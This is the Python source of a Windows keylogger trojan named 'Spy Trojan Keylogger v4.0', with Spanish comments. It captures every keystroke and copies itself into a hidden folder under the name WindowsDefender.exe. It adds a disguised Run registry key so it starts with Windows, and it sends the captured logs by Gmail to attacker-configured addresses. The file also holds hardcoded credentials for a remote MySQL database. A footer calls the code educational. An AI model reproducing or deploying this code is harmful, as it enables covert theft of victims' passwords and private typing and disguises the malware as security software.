# ░██████╗██████╗░██╗░░░██╗  ████████╗██████╗░░█████╗░░░░░░██╗░█████╗░███╗░░██╗
# ██╔════╝██╔══██╗╚██╗░██╔╝  ╚══██╔══╝██╔══██╗██╔══██╗░░░░░██║██╔══██╗████╗░██║
# ╚█████╗░██████╔╝░╚████╔╝░  ░░░██║░░░██████╔╝██║░░██║░░░░░██║███████║██╔██╗██║
# ░╚═══██╗██╔═══╝░░░╚██╔╝░░  ░░░██║░░░██╔══██╗██║░░██║██╗░░██║██╔══██║██║╚████║
# ██████╔╝██║░░░░░░░░██║░░░  ░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚███║
# ╚═════╝░╚═╝░░░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝

# ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
# ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
# █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
# ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v4.0

# Librerías Utilizadas
from pynput.keyboard import Key, Listener
import pynput
from getpass import getuser # Obtiene el nombre del usuario
from datetime import datetime
from winreg import *
import datetime
import os
import yagmail
import shutil
import time
import threading # Hilos
import socket    # Librería verifica internet 





def addStartup():  # function =  Iniciar automaticamente
    path = GetPathOcult()+ GetNameKey() # Path del Software completo
    name = "Windows Defender Key"                                                   # Nombre del StartUp     // Solo se ve en el registro *Regedit*
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
    def verificar():
        try:  # Intenta crear la dirección
            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')                   # Carpeta especial de verificación de startup <No cambiar si no sabe lo que es>
            return True # Se creó la carpeta
        except:
            return False# La carpeta ya existe
    try:    # Solo si tiene permisos de administrador
        registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # machine
        SetValueEx(registry,name, 0, REG_SZ, path)
        verificar() # Crea Carpeta
    except: # Si no tiene permisos de administrador
        if (verificar()):
            registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
            SetValueEx(registry,name, 0, REG_SZ, path)
# Cópia él Keylogger a la carpeta oculta 
def EscondeKey():
    CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
    try:
        with open(FilePath(), 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
            print("El keylogger ya se encontraba oculta en la carpeta: \n["+FilePath()+"]")
    except :
        print("El Keylogger no se encuentra escondido...\nSe tratará de esconderlo...")
        try:
            shutil.copy(GetNameKey() , FilePath()) # Intenta ocultar el keylogger en una carpeta
            print("\nEl keylogger se escondió exitosamente en el sistema")
        except:
            print("\nHubo un problema al esconder el El keylogger")




# Obtiene registro de teclas y guarda en un archivo reg.k
def KeyLogger():
    # Convierte tecla a un valor legible
    def KeyConMin(argument):                # Caracteres Comunes // Optimizados
        switcher = {
            # Vocales Minisculas
            "'a'": "a",
            "'e'": "e",
            "'i'": "i",
            "'o'": "o",
            "'u'": "u",
            # Letras  Minusculas
            "'b'": "b",
            "'c'": "c",
            "'d'": "d",
            "'f'": "f",
            "'g'": "g",
            "'h'": "h",
            "'j'": "j",
            "'J'": "J",
            "'k'": "k",
            "'l'": "l",
            "'m'": "m",
            "'n'": "n",
            "'ñ'": "ñ",
            "'p'": "p",
            "'q'": "q",
            "'r'": "r",
            "'s'": "s",
            "'t'": "t",
            "'v'": "v",
            "'w'": "w",
            "'x'": "x",
            "'y'": "y",
            "'z'": "z",
            # Caracteres
            "','": ",",                     # ,
            "'.'": ".",                     # .
            "'_'": "_",                     # _
            "'-'": "-",                     # -
            "':'": ":",                     #
            # Vocales Mayúsculas
            "'A'": "A",
            "'E'": "E",
            "'I'": "I",
            "'O'": "O",
            "'U'": "U",
            # Letras Mayúsculas
            "'B'": "B",
            "'C'": "C",
            "'D'": "D",
            "'F'": "F",
            "'G'": "G",
            "'H'": "H",
            "'K'": "K",
            "'L'": "L",
            "'M'": "M",
            "'N'": "N",
            "'Ñ'": "Ñ",
            "'P'": "P",
            "'Q'": "Q",
            "'R'": "R",
            "'S'": "S",
            "'T'": "T",
            "'V'": "V",
            "'W'": "W",
            "'X'": "X",
            "'Y'": "Y",
            "'Z'": "Z",
            # Números Standard
            "'1'": "1",
            "'2'": "2",
            "'3'": "3",
            "'4'": "4",
            "'5'": "5",
            "'6'": "6",
            "'7'": "7",
            "'8'": "8",
            "'9'": "9",
            "'0'": "0",
            # Caracteres Especiales
            "'@'": "@",                     # @
            "'#'": "#",                     # #
            "'*'": "*",                     #
            "'('": "(",                     # (
            "')'": ")",                     # )
            "'?'": "?",                     # ?
            "'='": "=",                     # =
            "'+'": "+",                     # +
            "'!'": "!",                     # !
            "'}'": "}",                     # }
            "'{'": "{",                     # {}
            "'´'": "´",                     # ´
            "'|'": "|",                     # |
            "'°'": "°",                     # °
            "'^'": "¬",                     # ^
            "';'": ";",                     #
            "'$'": "$",                     # $
            "'%'": "%",                     # %
            "'&'": "&",                     # &
            "'>'": ">",                     #
            "'<'": "<",                     # 
            "'/'": "/",                     # /
            "'¿'": "¿",                     # ¿
            "'¡'": "¡",                     # ¡
            "'~'": "~"                      #
        }
        return switcher.get(argument, "")

    # Convierte tecla a un valor legible
    def KeyConMax(argument):                # Botones, comunes // Optimizados
        switcher = {
            "Key.space": " ",               # Espacio
            "Key.backspace": "«",           # Borrar
            "Key.enter": "\r\n",            # Salto de linea
            "Key.tab": "    ",              # Tabulación
            "Key.delete":" «×» ",           # Suprimir
            # Números
            "<96>": "0",                 # 0
            "<97>": "1",                 # 1
            "<98>": "2",                 # 2
            "<99>": "3",                 # 3
            "<100>": "4",                # 4
            "<101>": "5",                # 5
            "<102>": "6",                # 6
            "<103>": "7",                # 7
            "<104>": "8",                # 8
            "<105>": "9",                # 9
            # Números Númeral
            "None<96>": "0",                 # 0
            "None<97>": "1",                 # 1
            "None<98>": "2",                 # 2
            "None<99>": "3",                 # 3
            "None<100>": "4",                # 4
            "None<101>": "5",                # 5
            "None<102>": "6",                # 6
            "None<103>": "7",                # 7
            "None<104>": "8",                # 8
            "None<105>": "9",                # 9
            # Teclas raras 2 
            "['^']": "^",
            "['`']": "`",                     #
            "['¨']": "¨",                     #
            "['´']": "´",                     #
            "<110>": ".",                     #
            "None<110>": ".",                 #
            "Key.alt_l": " [Alt L] ",         #
            "Key.alt_r": " [Alt R] ",
            "Key.shift_r": " [Shift R] ",
            "Key.shift":   " [Shift L] ",
            "Key.ctrl_r": " [Control R] ",    #
            "Key.ctrl_l": " [Control L] ",    #
            "Key.right" : " [Right] ",                 #
            "Key.left"  : " [Left] ",                  #
            "Key.up"    : " [Up]",                    #
            "Key.down"  : " [Down] ",                  #
            #"'\x16'"  : " [Pegó] ",
            #"'\x18'"  : " [Cortar] ", 
            #"'\x03'"  : " [Copiar] ", 
            "Key.caps_lock"  : " [Mayus lock] ",  
            #"Key.media_previous"    : " ♫ ",     #
            #"Key.media_next"        : " ♫→ ",         #
            #"Key.media_play_pause"  : " ■ ♫ ■ ",#
            "Key.cmd"               : " [Windows] "          #
        }
        return switcher.get(argument, "")

    try:        # Intenta crear el archivo
        log = os.environ.get('pylogger_file', os.path.expanduser(logKeyPath()+LogName()) )
        T = datetime.datetime.now()
        getTime = "Fecha:      ["+  T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + "]\nHora:       [" + T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")+ " con " + T.strftime("%S") +" Segundos]\n"

        with open (log, "a") as f:
            f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
    except: # Si no puede crear el archivo, crea el directorio faltante
        CreateDir()  # Function: Crea el directorio Ejemplo: ==> C:\Users\Public\Security\Windows Defender
    
    def on_press(key):
        with open(log, "a") as f:
            if (len(str(key))) <= 3:
                print("Se oprimio la tecla: "+KeyConMin(str(key))) 
                f.write(KeyConMin(str(key)))
            else:
                print("Se oprimio la tecla: "+KeyConMax(str(key)))
                f.write(KeyConMax(str(key)))

    with Listener(on_press=on_press) as listener:   # Escucha pulsaciones de teclas
        listener.join() 

# Renombre el archivo log, antes de ser envíado
def Rename(name):
    try:
        CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
        # Copia el archivo 
        pathO = logKeyPath()+ LogName()
        pathN = logKeyPath()+ name
        os.rename(pathO, pathN)
        print("El archivo reg.k se renombró correctamente")
    except:
        print("No se puedo renombrar el archivo 'reg.k' ")
        pass

# Crea el directorio oculto 
def CreateDir():
    try:  # Intenta crear la dirección
        os.makedirs(GetPathOcult())
    except :
        pass
    try:  # Intenta crear la dirección del registro de teclas..
        os.makedirs(logKeyPath())
    except :
        pass

# Intervalo de tiempo que se enviará el archivo reg.k
def SendLog():

    # Función = Verifica si hay conexión a internet para poder envíar el log
    def VerificarConexion():
        con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
        try:                                                            # Intenta conectarse al servidor de Google
            con.connect(('www.google.com', 80))
            con.close()
            print("Conexión a internet => [OK]")
            return True
        except:
            print("Conexión a internet => [NO]")
            return False
    # Envía los datos reg.k vía Gmail 
    def SendGmail(log, sender_email, sender_password, receiver_email):
        try:
            mifecha                 = datetime.datetime.now()
            subject                 = "Data User: "+ str(getuser()) 
            # Inicia Sesión 
            yag = yagmail.SMTP(user=sender_email, password=sender_password)
            informacion = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
            # Cuerpo del mensaje
            contents = [ 
                "Información:\n\nNombre de Usuario: "+ str(getuser()) + informacion
            ]
            yag.send(receiver_email, subject, contents, attachments=log )
            print("[+] Se envió el Registro de teclas correctamente")
            return True
        except:
            print("[-] No se pudo envíar el Registro de teclas")
            return False










    n = 1   # Para renombre los archivos
    while (True):
        n = n+1
        time.sleep(timeSend()*60) 
        if VerificarConexion(): # Continua solo si hay conexión a internet
            # Crea nombre del archivo
            nameFile = str(getuser())+" "+str(n)+".txt"
            #Renombra el archivo original
            Rename(nameFile)    # Cambia el archivo `reg.k` a  `log2.txt`

            #Envía el archivo renombrado
            CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
            homedir = logKeyPath()+str(nameFile)

            print("Proceso de envío")

            if SendGmail(homedir, emailP(), passP() , ReceiveE()):    # Envía con el primer correo
                #Si se envíó correctamente, pues elimina el archivo
                os.remove(homedir)
            elif SendGmail(homedir, emailS(), passS() , ReceiveE()):  # Envía con el segundo correo 
                os.remove(homedir)
        else:   # No hay conexión
            # Seguirá sobreescribiendo el archivo   # Verificar pruba de errores
            # No hará nada, y esperará que haya una conexión exitosa
            pass     

# ***************************************   ZONA CUSTOM AVANZADA  ***********************************

# NOTA:| Solo Cambie éstas variables si sabe      |
#      | lo que está haciendo, en caso contrario  |
#      | el Keylogger no funcionará correctamente |

def GetNameKey():                   # Retorna el nombre del Keylogger compilado *.EXE
    return "WindowsDefender.exe"    # este archivo debe tener el mismo nombre "WindowsDefender.py"  
def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger
    return "C:\\Users\\Public\\Security\\Windows Defender\\"
def logKeyPath():   # Ruta del registro de teclas.
    # Ruta donde se guardará temporalmente el Registro de teclas
    return "C:\\Users\\Public\\Security\\Settings\\"
def LogName():  # Es el nombre que tendrá el registro de teclas.
    return "reg.k"             # <= Opcional, cambie de nombre al archivo 
def FilePath():
    return GetPathOcult()+GetNameKey()  # <No cambiar>

# ************************************  FIN ZONA CUSTOM AVANZADA   *********************************





# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************


# ************ Zona Gmail ************* 
# Correo de envío [Primaria] 
def emailP():                   # <<== Cambia éste correo
    return "correo1@gmail.com" 
def passP():                    # <<== Contraseña del correo
    return "contra1"
# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
def emailS():                   # <<== Cambia éste correo
    return "correo2@gmail.com"
def passS():                   # <<== Contraseña del correo 
    return "pass2"

#Correos que recibirán el registro de teclas.
def ReceiveE():
    #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo

# ************ Fin Zona Gmail ************* 

# ************ Zona MediaFire ************* 
# Se usará el API de Mediafire para subir el archivo reg.k(registro de teclas)
def MFUser():
    return "23Roqew@gmail.com"

def MFPass():
    return "###ertwqerwq"

# ************ Zona MediaFire ************* 



def timeSend(): # Tiempo de envío perzonalizado
    return 1 #Minutos                 <= Escoja su tiempo en minutos

# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************

def SendDataBaseMySQL():
    import pymysql
    DB_HOST = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"                # Host
    DB_USER = "udwlsyrbtldkznqo"              # Usuario de la base de datos
    DB_PASS = "OR2i2dfdgWek0UDiAv4f"              # Contraseña de la Base de Datos
    DB_NAME = "bh1g5gnxzw2igrvui8hq"   # Nombre de Base de datos
    DB_PORT = "3306"    # Opcional en algunos casos
    DB_CONEX = ""

    try:
        connection = pymysql.connect(
        host= DB_HOST, 
        user = DB_USER, 
        password = DB_PASS, 
        database = DB_NAME)

        cursor = connection.cursor()

        print("Se inició correctamente [DataBase]")
    except:
        print("Error al iniciar sesión [DataBase]")

    def UpdateUser(id,name):

        sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
        try:
            cursor.execute(sql)
            connection.commit()
        except:
            print("Error al obtener")
            pass
        
    UpdateUser(1,"dsf")



    print("")









    # API client does not know about the token
    # until explicitly told about it:


# Inicio multihilo
if __name__ == '__main__':

    SendDataBaseMySQL()

    #EscondeKey()    # Se replica dentro de la computadora
    #addStartup()    # Modifica registro de arranque
    p1 = threading.Thread(target=KeyLogger)   # Registra teclas

    #p2 = threading.Thread(target=SendLog)   # Enviar Registro
    #p2.start()
    p1.start()
    p1.join()



#################################################################
#                                                               #
#                 Developed by SebastianEPH                     #
#                                                   v4.0   #
#################################################################
# NOTAS IMPORTANTES:
#
# *** Éste script fue creado solo con fines educativos, por ese detalle el script está documentado, no me hago responsabe por un posible mal uso de éste script***
#
# Lea la documentación antes de usar: https://github.com/SebastianEPH/SpyTrojan_Keylogger

